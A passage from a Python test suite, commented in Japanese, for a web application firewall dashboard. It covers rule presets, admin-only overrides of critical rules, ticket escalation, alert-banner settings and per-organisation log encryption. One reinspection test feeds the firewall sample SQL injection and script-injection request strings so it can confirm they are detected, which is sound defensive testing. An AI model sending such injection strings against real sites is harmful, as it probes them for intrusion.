          st_ == 200 and json.loads(body_).get("removed", 0) >= 2 and not list(ls.read_backend("bk-a"))
          and not any('"bk-a"' in open(os.path.join(root16, "_all", n), encoding="utf-8").read() for n in os.listdir(os.path.join(root16, "_all")) if n.endswith(".log"))
          and not any('"bk-a"' in open(os.path.join(root16, "a", "_all", n), encoding="utf-8").read() for n in os.listdir(os.path.join(root16, "a", "_all")) if n.endswith(".log")))
    check("画面: イベントログに書き出しボタン(一般には隠す)", 'id="lf-export"' in dashboard.PAGE and "body.limited:not(.analyst) .lf-exp" in dashboard.PAGE
          and "retention_attack_days" in dashboard.PAGE)

    # ルールのモードプリセット
    pv = wb.presets_view()
    cnt = {p["id"]: (p["block"], p["detect"]) for p in pv["presets"]}
    check("プリセット: 遮断/検知のみの数(標準 62/41・厳格 102/1・投稿 58/45・API 67/36・ファイル 65/38)",
          cnt == {"standard": (62, 41), "strict": (102, 1), "post": (58, 45), "api": (67, 36), "upload": (65, 38)} and len(pv["presets"]) == 5)
    mstd, mstr, mpost = wb.preset_modes("standard"), wb.preset_modes("strict"), wb.preset_modes("post")
    check("プリセット: 標準=mediumは検知のみ・厳格=LOGIC-006だけ検知のみ・投稿型の差分",
          mstd["SQLI-003"] == "detect" and mstd["SQLI-001"] == "block" and mstr["LOGIC-006"] == "detect" and mstr["SQLI-003"] == "block"
          and mpost["XSS-007"] == "detect" and mpost["XSS-011"] == "block")
    check("プリセット: criticalの6件はどのプリセットでも遮断", all(wb.preset_modes(k)[r] == "block" for k in wb.PRESET_ORDER for r in wb.CRITICAL_IDS)
          and set(wb.CRITICAL_IDS) == {"XSS-001", "XSS-002", "XXE-001", "PROTO-001", "PROTO-002", "RESP-001"})
    check("プリセット: 既存(未設定)の接続先は従来どおり全ルール遮断", wb.detect_ids({"rule_preset": ""}) == set() and wb.preset_counts("") == {"block": 103, "detect": 0, "total": 103})
    check("プリセット: 新規の接続先は標準になる", wb.DEFAULT_NEW_PRESET == "standard")
    pr = lambda u, d: get(p2, "/api/backend-rules", "POST", json.dumps(d), H[u])
    bget = lambda u, bid: [b for b in json.loads(get(p2, "/api/backend-rules", headers=H[u])[1])["backends"] if b["id"] == bid][0]
    check("プリセット: 画面用の一覧(presets)と接続先ごとの状態が返る", "presets" in json.loads(get(p2, "/api/backend-rules", headers=H["anx"])[1]) and bget("anx", "bk-b")["rule_preset"] == "")
    check("プリセット: 一般ユーザーは変更も閲覧もできない(403)", pr("enb", {"backend": "bk-b", "op": "set_preset", "preset": "standard"})[0] == 403
          and get(p2, "/api/rule-presets/impact?backend=bk-b", headers=H["enb"])[0] == 403)
    check("プリセット: アナリストは担当外の接続先は変更できない(403)", pr("anx", {"backend": "bk-a", "op": "set_preset", "preset": "standard"})[0] == 403)
    st_, body_, _ = pr("anx", {"backend": "bk-b", "op": "set_preset", "preset": "standard", "keep_overrides": False})
    b_ = bget("anx", "bk-b")
    check("プリセット: アナリストが担当範囲の接続先のプリセットを選べる(標準 62/41)", st_ == 200 and b_["rule_preset"] == "standard" and b_["modes"]["block"] == 62 and b_["modes"]["detect"] == 41)
    check("プリセット: 「選べる範囲」はアナリストには変更できない(403)", pr("anx", {"backend": "bk-b", "op": "set_preset_allowed", "allowed": ["strict"]})[0] == 403)
    check("プリセット: 管理者が接続先ごとに選べる範囲を決められる", pr("adm", {"backend": "bk-b", "op": "set_preset_allowed", "allowed": ["standard", "strict"]})[0] == 200
          and bget("adm", "bk-b")["preset_allowed"] == ["standard", "strict"])
    check("プリセット: 範囲外はアナリストには選べない(サーバー側で拒否)", pr("anx", {"backend": "bk-b", "op": "set_preset", "preset": "api"})[0] == 400
          and pr("anx", {"backend": "bk-b", "op": "set_preset", "preset": "strict"})[0] == 200)
    check("プリセット: 管理者は範囲外のプリセットも選べる", pr("adm", {"backend": "bk-b", "op": "set_preset", "preset": "api"})[0] == 200 and bget("adm", "bk-b")["rule_preset"] == "api")
    pr("adm", {"backend": "bk-b", "op": "set_preset_allowed", "allowed": []})
    pr("anx", {"backend": "bk-b", "op": "set_preset", "preset": "standard"})
    # 手動の上書き
    pr("anx", {"backend": "bk-b", "op": "detect", "rule": "SQLI-001"})
    pr("anx", {"backend": "bk-b", "op": "block", "rule": "SQLI-003"})
    b_ = bget("anx", "bk-b")
    check("上書き: 基準と違うルールだけを持つ(SQLI-001→検知のみ・SQLI-003→遮断で「+2件変更」)",
          b_["rule_detect"] == ["SQLI-001"] and b_["rule_block"] == ["SQLI-003"] and sorted(b_["preset_diff"]) == ["SQLI-001", "SQLI-003"])
    pr("anx", {"backend": "bk-b", "op": "detect", "rule": "SQLI-003"})
    pr("anx", {"backend": "bk-b", "op": "block", "rule": "SQLI-001"})
    check("上書き: 基準に戻すと上書きは消える", bget("anx", "bk-b")["preset_diff"] == [] and bget("anx", "bk-b")["rule_block"] == [])
    pr("anx", {"backend": "bk-b", "op": "detect", "rule": "SQLI-001"})
    pr("anx", {"backend": "bk-b", "op": "set_preset", "preset": "strict", "keep_overrides": True})
    check("プリセット変更: 個別の上書きを残して切り替えられる(厳格+1件変更)", bget("anx", "bk-b")["rule_preset"] == "strict" and "SQLI-001" in bget("anx", "bk-b")["preset_diff"])
    pr("anx", {"backend": "bk-b", "op": "set_preset", "preset": "standard", "keep_overrides": False})
    check("プリセット変更: 上書きをリセットして切り替えられる", bget("anx", "bk-b")["preset_diff"] == [] and bget("anx", "bk-b")["rule_detect"] == [])
    # critical の床
    st1 = pr("anx", {"backend": "bk-b", "op": "detect", "rule": "XSS-001"})[0]
    st2 = pr("adm", {"backend": "bk-b", "op": "detect", "rule": "XSS-001"})[0]
    st3 = pr("adm", {"backend": "bk-b", "op": "disable", "rule": "RESP-001"})[0]
    check("critical: アナリストはバックエンド単位で検知のみ・使わないにできない(400) / 管理者はできる(200)", st1 == 400 and st2 == 200 and st3 == 200)
    _pb = bget("adm", "bk-b")
    check("critical: 管理者が外した分は実際のモードに反映され、基準との差分にも出る",
          "XSS-001" in _pb["rule_detect"] and "RESP-001" in _pb["rule_disabled"] and "XSS-001" in _pb["preset_diff"] and "RESP-001" in _pb["preset_diff"]
          and wb.effective_modes({"rule_preset": "standard", "rule_detect": ["XSS-001"], "rule_disabled": ["RESP-001"]})["XSS-001"] == "detect"
          and wb.effective_modes({"rule_preset": "standard", "rule_detect": ["XSS-001"], "rule_disabled": ["RESP-001"]})["RESP-001"] == "off"
          and wb.effective_modes({"rule_preset": "standard"})["XSS-001"] == "block")
    check("critical: 管理者が外した検知のみは、一致の処理にも効く(遮断対象から外れる)",
          "XSS-001" in wb.detect_ids({"rule_preset": "standard", "rule_detect": ["XSS-001"]})
          and not wb.apply_rule_overrides_ex({"rule_disabled": ["RESP-001"]}, [{"id": "RESP-001"}], "/")[0])
    pr("adm", {"backend": "bk-b", "op": "block", "rule": "XSS-001"}); pr("adm", {"backend": "bk-b", "op": "enable", "rule": "RESP-001"})
    check("critical: 管理者が元の遮断に戻せる", "XSS-001" not in bget("adm", "bk-b")["rule_detect"] and "RESP-001" not in bget("adm", "bk-b")["rule_disabled"])
    check("critical: アナリストはパス別の除外(検知のみ)にもできない / 管理者はできる",
          pr("anx", {"backend": "bk-b", "op": "add_exclusion", "rule": "XSS-001", "path_prefix": "/e", "minutes": 60, "mode": "detect"})[0] == 400
          and pr("adm", {"backend": "bk-b", "op": "add_exclusion", "rule": "XSS-001", "path_prefix": "/e", "minutes": 60, "mode": "detect"})[0] == 200)
    pr("anx", {"backend": "bk-b", "op": "add_exclusion", "rule": "*", "path_prefix": "/star", "minutes": 60, "mode": "detect"})
    ex_prof = {"rule_preset": "standard", "exclusions": [e for e in bget("adm", "bk-b")["exclusions"] if e["path_prefix"] == "/star"]}
    _k, _n, det_ = wb.apply_rule_overrides_ex(ex_prof, [{"id": "XSS-001"}, {"id": "SQLI-001"}], "/star/x")
    check("critical: アナリストが作った全ルール(*)のパス別検知のみは、criticalには効かない", det_ == {"SQLI-001"})
    pr("adm", {"backend": "bk-b", "op": "remove_exclusion", "exclusion": [e for e in bget("adm", "bk-b")["exclusions"] if e["path_prefix"] == "/e"][0]["id"]})
    for e_ in [e for e in bget("adm", "bk-b")["exclusions"] if e["path_prefix"] == "/star"]:
        pr("adm", {"backend": "bk-b", "op": "remove_exclusion", "exclusion": e_["id"]})
    # 履歴と「1つ前に戻す」
    pr("anx", {"backend": "bk-b", "op": "set_preset", "preset": "post"})
    hist_p = [h for h in json.loads(get(p2, "/api/rule-history", headers=H["anx"])[1])["history"] if h.get("op") == "set_preset"]
    check("履歴: プリセット変更が履歴に残り、変更前の状態を持つ", hist_p and hist_p[0].get("preset") == "post" and isinstance(hist_p[0].get("before"), dict) and hist_p[0]["before"]["rule_preset"] == "standard")
    check("元に戻す: 直前の変更を戻せる(戻る前の状態に)", bget("anx", "bk-b")["undo"] and pr("anx", {"backend": "bk-b", "op": "undo"})[0] == 200 and bget("anx", "bk-b")["rule_preset"] == "standard")
    check("元に戻す: 戻した直後はもう戻せない(1つ前の1件だけ)", pr("anx", {"backend": "bk-b", "op": "undo"})[0] == 400 and bget("anx", "bk-b")["undo"] is None)
    pr("adm", {"backend": "bk-b", "op": "set_preset", "preset": "strict"})
    check("元に戻す: アナリストは管理者の変更は戻せない / 管理者は戻せる",
          pr("anx", {"backend": "bk-b", "op": "undo"})[0] == 400 and pr("adm", {"backend": "bk-b", "op": "undo"})[0] == 200 and bget("adm", "bk-b")["rule_preset"] == "standard")
    check("元に戻す: 戻した記録も履歴に残る", any(h.get("op") == "undo" for h in json.loads(get(p2, "/api/rule-history", headers=H["adm"])[1])["history"]))
    # 影響の試算
    st_, body_, _ = get(p2, "/api/rule-presets/impact?backend=bk-b&days=30", headers=H["anx"])
    imp_ = json.loads(body_) if st_ == 200 else {}
    check("影響の試算: 各プリセットの「遮断に変わる/通るようになる」件数が返る(再検査はしない)",
          st_ == 200 and set(imp_.get("impact", {})) == set(wb.PRESET_ORDER) and all({"to_block", "to_pass", "scanned"} <= set(v) for v in imp_["impact"].values()))
    check("影響の試算: 担当外の接続先は見られない(403)", get(p2, "/api/rule-presets/impact?backend=bk-a", headers=H["anx"])[0] == 403)
    evs_t = [{"path": "/x", "hits": [{"id": "SQLI-003"}]}, {"path": "/y", "hits": [{"id": "SQLI-001"}]}, {"path": "/z", "hits": []}]
    r_std = wb.impact_of(evs_t, {"rule_preset": "standard"}, "strict")
    r_leg = wb.impact_of(evs_t, {"rule_preset": ""}, "standard")
    check("影響の試算: 標準→厳格で検知のみだった1件が遮断に / 従来→標準で1件が通る",
          r_std["to_block"] == 1 and r_std["to_pass"] == 0 and r_leg["to_pass"] == 1 and r_leg["to_block"] == 0 and r_std["scanned"] == 2)
    check("再検査: 統合起動でないと使えない(501)", get(p2, "/api/rule-presets/reinspect", "POST", json.dumps({"backend": "bk-b"}), H["anx"])[0] == 501
          and get(p2, "/api/rule-presets/reinspect", "POST", json.dumps({"backend": "bk-b"}), H["enb"])[0] == 403)
    import types as _types
    insp_t = waf.Inspector(waf.load_config(None))
    it_, gd_ = waf.Runtime.reinspect_events(_types.SimpleNamespace(inspector=insp_t), [
        {"method": "GET", "path": "/s", "req": {"query": "q=1 UNION SELECT 1", "headers": {"User-Agent": "x"}}},
        {"method": "POST", "path": "/p", "req": {"query": "", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body": "c=%3Cscript%3Ealert(1)%3C/script%3E"}},
        {"method": "GET", "path": "/ok", "req": {"query": "q=hello", "headers": {}}}])
    imp2 = wb.impact_items(it_, {"rule_preset": "standard"}, "strict", global_detect=gd_)
    check("再検査: ログのリクエストの内容を検査し直せる(攻撃は検知・通常は何も当たらない)",
          [bool(h) for _p, h in it_] == [True, True, False] and any(x["id"] == "XSS-001" for x in it_[1][1]) and imp2["scanned"] == 2)
    check("画面: プリセットのカード・影響・元に戻す・詳細設定の折りたたみ・許可範囲",
          all(k in dashboard.PAGE for k in ("berPresetRender", "berPresetSet", "berUndo", "berReinspect", "berAllowSet", 'id="berAdv"', "/api/rule-presets/impact", "ber-adv", "pset-grid")))
    # 新規の接続先は標準、既存は変えない
    cfg_new = {"backends": [dict(id="old", name="旧", scheme="http", host="127.0.0.1", port=9)]}
    old_p = wb.normalize_profile(dict(id="old", name="旧", scheme="http", host="127.0.0.1", port=9), set())
    nb_ = wb.normalize_backend_settings({"profiles": [dict(id="old", name="旧", scheme="http", host="127.0.0.1", port=9),
                                                      dict(id="tmp-1", name="新", scheme="http", host="127.0.0.1", port=9)]}, {"profiles": [old_p]})
    check("プリセット: 既存の接続先は従来のまま、追加した接続先は標準", [p["rule_preset"] for p in nb_["profiles"]] == ["", "standard"])

    # 申請の流れ: 一般、担当アナリスト(いなければ提供元アナリスト)、管理者の順
    orgs_t = wo.normalize_orgs([
        {"id": "a", "type": "direct", "name": "A社(SOCなし)"},
        {"id": "d", "type": "direct", "name": "D社(SOCあり)"},
        {"id": "x", "type": "intermediary", "name": "X社"},
        {"id": "b", "type": "enduser", "parent": "x"}])
    pw_ = lambda p: wx.hash_password(p)
    cfg_t = {"orgs": orgs_t,
             "dashboard": {"users": [
                 {"username": "adm", "role": "admin", "password_hash": pw_("Adm!Passw0rd")},
                 {"username": "anx", "role": "analyst", "scope": ["x"], "password_hash": pw_("Anx!Passw0rd")},
                 {"username": "and", "role": "analyst", "scope": ["d"], "password_hash": pw_("And!Passw0rd")},
                 {"username": "prv", "role": "analyst", "scope": [], "provider": True, "password_hash": pw_("Prv!Passw0rd")},
                 {"username": "ub", "role": "user", "org": "b", "password_hash": pw_("Ub!Passw0rd")},
                 {"username": "ua", "role": "user", "org": "a", "password_hash": pw_("Ua!Passw0rd")},
                 {"username": "ud", "role": "user", "org": "d", "password_hash": pw_("Ud!Passw0rd")}]},
             "backends": [dict(id="t-a", name="A", scheme="http", host="127.0.0.1", port=9, owner="adm", org="a"),
                          dict(id="t-b", name="B", scheme="http", host="127.0.0.1", port=9, owner="adm", org="b"),
                          dict(id="t-d", name="D", scheme="http", host="127.0.0.1", port=9, owner="adm", org="d")],
             "active_backend": "t-a", "listen_host": "127.0.0.1", "listen_port": 18081}
    cfgp_t = os.path.join(TMP, "tk_cfg.json")
    with open(cfgp_t, "w", encoding="utf-8") as f:
        json.dump(cfg_t, f)
    logp_t = os.path.join(TMP, "tk_dash.log")
    open(logp_t, "w").close()
    ctl_t = dashboard.FileConfigControl(cfgp_t)
    ds_t = ThreadingHTTPServer(("127.0.0.1", free_port()), dashboard.make_handler(logp_t, dashboard.GeoResolver(enabled=False, egress=False), control=ctl_t))
    threading.Thread(target=ds_t.serve_forever, daemon=True).start()
    pt = ds_t.server_address[1]

    def login_t(u, pw):
        _s, _, hd_ = get(pt, "/login", "POST", f"username={u}&password={pw}".encode(), {"Content-Type": "application/x-www-form-urlencoded"})
        return {"Cookie": (hd_.get("Set-Cookie") or "").split(";")[0], "Content-Type": "application/json"}
    HT = {u: login_t(u, pw) for u, pw in (("adm", "Adm!Passw0rd"), ("anx", "Anx!Passw0rd"), ("and", "And!Passw0rd"), ("prv", "Prv!Passw0rd"),
                                           ("ub", "Ub!Passw0rd"), ("ua", "Ua!Passw0rd"), ("ud", "Ud!Passw0rd"))}
    mk = lambda u, be: json.loads(get(pt, "/api/tickets", "POST", json.dumps({"kind": "inquiry", "backend": be, "subject": "確認"}), HT[u])[1])["ticket"]
    tvis = lambda u: [t["id"] for t in json.loads(get(pt, "/api/tickets", headers=HT[u])[1])["tickets"]]
    t_b, t_a, t_d = mk("ub", "t-b"), mk("ua", "t-a"), mk("ud", "t-d")
    check("申請の流れ: 中間企業のエンドユーザー→その中間企業のアナリストが一次対応", t_b["stage"] == "analyst" and t_b["id"] in tvis("anx") and t_b["id"] not in tvis("and") and t_b["id"] not in tvis("prv"))
    check("申請の流れ: 直接契約でSOCあり→その直接契約のアナリスト", t_d["stage"] == "analyst" and t_d["id"] in tvis("and") and t_d["id"] not in tvis("anx") and t_d["id"] not in tvis("prv"))
    check("申請の流れ: 直接契約でSOCなし→提供元アナリストが一次対応", t_a["stage"] == "analyst" and t_a["id"] in tvis("prv") and t_a["id"] not in tvis("anx") and t_a["id"] not in tvis("and"))
    check("提供元アナリスト: 担当アナリストのいない組織のバックエンドだけが見える",
          [b["id"] for b in json.loads(get(pt, "/api/security", headers=HT["prv"])[1])["backends"]] == ["t-a"])
    check("申請の流れ: 管理者には全件が返る(一次対応中の印つき)", all(i in tvis("adm") for i in (t_a["id"], t_b["id"], t_d["id"])))
    ana_t = json.loads(get(pt, "/api/tickets", "POST", json.dumps({"kind": "inquiry", "backend": "t-b", "subject": "アナリストの問い合わせ"}), HT["anx"])[1])["ticket"]
    check("申請の流れ: アナリスト自身の申請は管理者宛", ana_t["stage"] == "admin")
    es = lambda u, tid, r: get(pt, "/api/tickets/escalate", "POST", json.dumps({"id": tid, "reason": r}), HT[u])
    check("エスカレーション: 理由が空なら400", es("anx", t_b["id"], "")[0] == 400)
    check("エスカレーション: 一般ユーザー・担当外のアナリストはできない(403)", es("ub", t_b["id"], "x")[0] == 403 and es("and", t_b["id"], "x")[0] == 403 and es("prv", t_b["id"], "x")[0] == 403)
    st_, body_, _ = es("anx", t_b["id"], "ルールを使わない設定が必要です")
    tb2 = json.loads(body_).get("ticket", {})
    check("エスカレーション: 担当アナリストが理由つきで管理者へ依頼できる(状態=管理者対応中・理由はコメントに残る)",
          st_ == 200 and tb2.get("stage") == "admin" and tb2.get("status") == "escalated" and tb2.get("escalated_by") == "anx"
          and any("ルールを使わない設定が必要です" in c["text"] for c in tb2.get("comments", [])))
    check("エスカレーション: 二重の依頼は不可", es("anx", t_b["id"], "again")[0] == 400)
    check("エスカレーション: 依頼中はアナリストが状態を変えられない(コメントは可)",
          get(pt, "/api/tickets/status", "POST", json.dumps({"id": t_b["id"], "status": "done"}), HT["anx"])[0] == 403
          and get(pt, "/api/tickets/comment", "POST", json.dumps({"id": t_b["id"], "text": "補足"}), HT["anx"])[0] == 200)
    st_, body_, _ = get(pt, "/api/tickets/status", "POST", json.dumps({"id": t_b["id"], "status": "done", "resolution": "対応しました"}), HT["adm"])
    check("エスカレーション: 管理者が完了にすると、申請者とアナリストにも反映される",
          st_ == 200 and [t["status"] for t in json.loads(get(pt, "/api/tickets", headers=HT["ub"])[1])["tickets"] if t["id"] == t_b["id"]] == ["done"]
          and [t["status"] for t in json.loads(get(pt, "/api/tickets", headers=HT["anx"])[1])["tickets"] if t["id"] == t_b["id"]] == ["done"])
    get(pt, "/api/tickets/status", "POST", json.dumps({"id": t_d["id"], "status": "in_progress"}), HT["and"])
    td2 = [t for t in json.loads(get(pt, "/api/tickets", headers=HT["adm"])[1])["tickets"] if t["id"] == t_d["id"]][0]
    check("一次対応: 対応したアナリスト名が記録され、管理者宛にはならない", td2["handler"] == "and" and td2["stage"] == "analyst" and td2["status"] == "in_progress")
    check("ユーザー管理: 提供元アナリストの指定を保存し、アナリスト以外は無効", any(u["username"] == "prv" and u["provider"] for u in wx.users_view(cfg_t))
          and not any(u["provider"] for u in wx.users_view(cfg_t) if u["role"] != "analyst"))
    wx.users_apply(cfg_t, {"action": "update", "username": "prv", "provider": False}, {"username": "adm", "role": "admin"})
    with open(cfgp_t, "w", encoding="utf-8") as f:
        json.dump(cfg_t, f)
    HT["prv"] = login_t("prv", "Prv!Passw0rd")
    t_a2 = mk("ua", "t-a")
    check("申請の流れ: 提供元アナリストがいなければ、SOCなしの組織の申請は管理者宛", t_a2["stage"] == "admin")
    # 警報バナーの個人設定(全ユーザー)
    sa = lambda u, d: get(pt, "/api/users", "POST", json.dumps(d), HT[u])
    ok_all = all(sa(u, {"action": "set_alert", "alert": {"enabled": False, "threshold": 9, "immediate": "high", "window": 999999}})[0] == 200 for u in ("ub", "anx", "prv", "adm"))
    me_ = lambda u: json.loads(get(pt, "/api/auth", headers=HT[u])[1])["user"]
    check("警報バナー: 一般・アナリスト・管理者の全員が自分の設定を保存できる(値は範囲内に丸める)",
          ok_all and me_("ub")["alert"] == {"enabled": False, "immediate": "high", "threshold": 9, "window": 300})
    check("警報バナー: 他のユーザーには影響しない", not me_("ua")["alert"] if False else not json.loads(get(pt, "/api/auth", headers=login_t("ud", "Ud!Passw0rd"))[1])["user"]["alert"])
    sa("ub", {"action": "set_alert", "reset": True})
    check("警報バナー: 全体の既定に戻せる", me_("ub")["alert"] == {})
    check("警報バナー: 一般ユーザーも全体の既定を取得できる(設定画面の表示用)", "alert" in json.loads(get(pt, "/api/config", headers=HT["ub"])[1])["editable"])
    sa("ub", {"action": "set_alert", "alert": {"position": "both"}})
    check("警報バナー: 表示位置(上/下/上下)を個人で保存でき、不正な値は捨てる", me_("ub")["alert"] == {"position": "both"}
          and (sa("ub", {"action": "set_alert", "alert": {"position": "left"}}) and me_("ub")["alert"] == {}))
    check("警報バナー: 全体の既定の表示位置は top で、上下の設定を保存できる",
          dashboard.alert_view({})["position"] == "top" and dashboard.alert_view({"alert": {"position": "both"}})["position"] == "both" and dashboard.alert_view({"alert": {"position": "bottom"}})["position"] == "top"
          and dashboard.alert_view({"alert": {"position": "x"}})["position"] == "top"
          and (lambda d: (dashboard.alert_update(d, {"position": "both"}), d["alert"]["position"])[1])({}) == "both")
    check("画面: 個人設定は全体の既定と同じ値を保存しない(既定に従い続ける)・マウスを乗せても帯は止まらない",
          "全体の既定と同じ値の項目は保存しない" in dashboard.PAGE and "animation-play-state:paused" not in dashboard.PAGE.split("攻撃アラート(警報バナー)")[1].split("</style>")[0])
    sa("ub", {"action": "set_alert", "alert": {"bg": False}})
    check("警報の背景(六角形): 全体の既定はON、個人でOFFにでき、画面に六角形とEMERGENCY表示がある",
          dashboard.alert_view({})["bg"] is True and dashboard.alert_view({"alert": {"bg": False}})["bg"] is False and me_("ub")["alert"] == {"bg": False}
          and (sa("ub", {"action": "set_alert", "reset": True}) and True)
          and "alertBg" in dashboard.PAGE and "EMERGENCY" in dashboard.PAGE and "alBgFrame" in dashboard.PAGE and "s-albg" in dashboard.PAGE and "m-albg" in dashboard.PAGE)
    check("画面: リロードしても開いていたページ(設定はタブも)に戻る(URLの#に保存)",
          "navHashSave" in dashboard.PAGE and "navHashLoad" in dashboard.PAGE and "history.replaceState" in dashboard.PAGE and "hashchange" in dashboard.PAGE)
    check("画面: 攻撃アラートのオン/オフは管理者の全体設定が優先(全体オフなら個人でオンにできない)・一般/アナリストの設定タブは「アカウント・通知」",
          "!!g.enabled && (mine.enabled===undefined||!!mine.enabled)" in dashboard.PAGE and "アカウント・通知" in dashboard.PAGE and "AUTH.limited)?'アカウント・通知'" in dashboard.PAGE)
    check("画面: 警報バナーを下にも出せる(下バナー・表示位置の選択)",
          "alertBarB" in dashboard.PAGE and "alBuildBottom" in dashboard.PAGE and "s-alpos" in dashboard.PAGE and "m-alpos" in dashboard.PAGE and "--abb-h" in dashboard.PAGE)
    check("警報バナー: 他人の設定や通常のユーザー管理は変更できない(403)", sa("ub", {"action": "update", "username": "ua", "role": "admin"})[0] in (400, 403))
    check("画面: 警報バナーの個人設定・ボタンと組織タブの入力欄がダークモードの色に合う",
          "alertMineHtml" in dashboard.PAGE and "set_alert" in dashboard.PAGE and "#orgBody input:not([type=checkbox])" in dashboard.PAGE
          and ".lf-clr,#orgBody button" in dashboard.PAGE)
    check("画面: 管理者の一覧は一次対応中を畳み、アナリストに「管理者へ依頼」がある",
          "tkEscalate" in dashboard.PAGE and "TK_ALL" in dashboard.PAGE and "/api/tickets/escalate" in dashboard.PAGE)

    # ログ詳細の暗号化(waf_crypt: 組織ごとの鍵・キー・オフィサー・承認・操作記録)
    import waf_crypt as wc_
    import waf_org as wo_
    import waf_tickets as wt_
    pub_, priv_ = wc_.generate_keypair(2048)
    pubB_, privB_ = wc_.generate_keypair(2048)
    rec_ = {"action": "PASS", "client_ip": "1.2.3.4", "backend": "be_a", "query": "email=a@b.c", "req": {"headers": {"Cookie": "sid=SECRET"}, "body": "pw=hunter2"}, "resp": {"status": 200, "body": "<p>個人情報</p>"}}
    wc_.set_chain_fn(lambda bid: {"be_a": ["orga"], "be_a1": ["orga1", "orga"], "be_b": ["orgb"], "be_n": ["orgn"]}.get(bid, []))
    wc_.configure({"enabled": False, "org_keys": {"orga": pub_}})
    r0_ = wc_.seal_record(dict(rec_))
    check("ログ暗号化: OFFなら従来どおり平文", r0_.get("req") and "enc" not in r0_)
    wc_.configure({"enabled": True, "org_keys": {"orga": pub_, "orgb": pubB_}})
    r1_ = wc_.seal_record(dict(rec_))
    txt_ = json.dumps(r1_, ensure_ascii=False)
    check("ログ暗号化: ONなら詳細が平文で残らず、IP・アクションは残る",
          "SECRET" not in txt_ and "hunter2" not in txt_ and "a@b.c" not in txt_ and "個人情報" not in txt_
          and r1_["client_ip"] == "1.2.3.4" and r1_["action"] == "PASS" and "req" not in r1_ and "enc" in r1_)
    back_ = wc_.decrypt_record(r1_["enc"], priv_)
    check("ログ暗号化: 組織の秘密鍵で元に戻る", back_["req"]["headers"]["Cookie"] == "sid=SECRET" and back_["query"] == "email=a@b.c" and back_["resp"]["status"] == 200)
    try:
        wc_.decrypt_record(r1_["enc"], privB_); ok_ = False
    except Exception:
        ok_ = True
    check("ログ暗号化: 別の組織の秘密鍵では復号できない", ok_)
    rb_ = wc_.seal_record(dict(rec_, backend="be_b"))
    check("ログ暗号化: 接続先の組織ごとに別の鍵で暗号化される", rb_["enc"]["kid"] != r1_["enc"]["kid"] and wc_.decrypt_record(rb_["enc"], privB_)["query"] == "email=a@b.c")
    rc_ = wc_.seal_record(dict(rec_, backend="be_a1"))
    check("ログ暗号化: 子組織に鍵が無ければ親組織の鍵を使う", rc_["enc"]["kid"] == r1_["enc"]["kid"])
    rn_ = wc_.seal_record(dict(rec_, backend="be_n"))
    check("ログ暗号化: 鍵が未登録の組織は暗号化されない(従来どおり)", "enc" not in rn_ and rn_.get("req"))
    bad_ = dict(r1_["enc"]); ct_ = bytearray(wc_.b64d(bad_["ct"])); ct_[0] ^= 1; bad_["ct"] = wc_.b64e(bytes(ct_))
    try:
        wc_.decrypt_record(bad_, priv_); ok_ = False
    except Exception:
        ok_ = True
    check("ログ暗号化: 改ざんされた暗号文は復号で検出される(GCM)", ok_)
    check("ログ暗号化: 毎回違う暗号文", wc_.seal_record(dict(rec_))["enc"]["ct"] != r1_["enc"]["ct"] and wc_.seal_record(dict(rec_))["enc"]["ek"] != r1_["enc"]["ek"])
    ok_ = True
    for bad_conf_ in ({"org_keys": {"orga": "abc"}}, {"org_keys": {"orga": priv_}}, {"org_keys": {"zzz": pub_}}):
        try:
            wc_.apply({}, bad_conf_, {"orga", "orgb"}); ok_ = False
        except ValueError:
            pass
    try:
        wc_.apply({}, {"enabled": True}, {"orga"}); ok_ = False
    except ValueError:
        pass
    check("ログ暗号化: 壊れた鍵・秘密鍵・存在しない組織・鍵なしのONは保存できない", ok_)
    new_ = wc_.apply({}, {"enabled": True, "org_keys": {"orga": pub_}}, {"orga"})
    v_ = wc_.view(new_)
    check("ログ暗号化: 設定画面には指紋だけ返し、鍵本体は返さない", v_["enabled"] and v_["org_kids"].get("orga") and pub_ not in json.dumps(v_))
    wc_.configure({"enabled": True, "org_keys": {"orga": "broken"}})
    r2_ = wc_.seal_record(dict(rec_))
    check("ログ暗号化: 鍵が使えないときは、詳細を平文で残さない", "req" not in r2_ and "enc" not in r2_ and r2_.get("enc_error") is True)
    wc_.configure({"enabled": False})
    ap_ = os.path.join(TMP, "enc_audit.jsonl")
    for i_ in range(3):
        wc_.audit_append(ap_, {"who": "ko", "action": "fetch", "n": i_})
    rows_, chain_ok_ = wc_.audit_read(ap_)
    check("操作記録: つながりが正しい(新しい順)", chain_ok_ and len(rows_) == 3 and rows_[0]["n"] == 2)
    s_ = open(ap_, encoding="utf-8").read().replace('"n":1', '"n":9').replace('"n": 1', '"n": 9')
    open(ap_, "w", encoding="utf-8").write(s_)
    check("操作記録: 書き換えを検知できる", wc_.audit_read(ap_)[1] is False)
    check("ロール: key_officer が使え、担当組織だけ見える",
          wx.norm_role("key_officer") == "key_officer"
          and wo_.scope_orgs([{"id": "a", "parent": ""}, {"id": "b", "parent": ""}], {"role": "key_officer", "scope": ["a"]}) == {"a"}
          and wo_.scope_orgs([{"id": "a", "parent": ""}], {"role": "key_officer", "scope": []}) == set()
          and wo_.scope_orgs([{"id": "a", "parent": ""}, {"id": "b", "parent": ""}], {"role": "key_officer", "scope": [], "provider": True}) == {"a", "b"})
    cfg_v_ = {"dashboard": {"users": []}, "orgs": []}
    wx.users_apply(cfg_v_, {"action": "add", "username": "vko", "password": "Passw0rd!x", "role": "key_officer", "org": "vendor"}, {"username": "admin", "role": "admin"})
    check("ベンダー側キー・オフィサー: 所属がベンダーなら全組織を担当し、表示の provider も真になる",
          cfg_v_["dashboard"]["users"][0]["org"] == "vendor" and wx.users_view(cfg_v_)[0]["provider"] is True)
    wx.users_apply(cfg_v_, {"action": "update", "username": "vko", "display": "ベンダーKO"}, {"username": "admin", "role": "admin"})
    check("ベンダー: 表示名を更新しても、ベンダー所属は外れない(以前の不具合)", cfg_v_["dashboard"]["users"][0]["org"] == "vendor")
    ts2_ = wt_.TicketStore(os.path.join(TMP, "tk_dec.json"), mailer=lambda s, b: None)
    now_ = time.strftime("%Y-%m-%dT%H:%M:%S")
    t_ = ts2_.create("ko", "decrypt", "be_a", "調査", grant={"from": "2026-01-01T00:00:00", "to": "2026-01-02T00:00:00"}, role="key_officer")
    try:
        ts2_.create("ko", "decrypt", "be_a", "x", grant={"from": "2026-01-01T00:00:00", "to": "2026-06-01T00:00:00"}); ok_ = False
    except ValueError:
        ok_ = True
    check("復号の申請: 期間は31日まで・必須", ok_ and t_["grant"]["from"] and "until" not in t_["grant"])
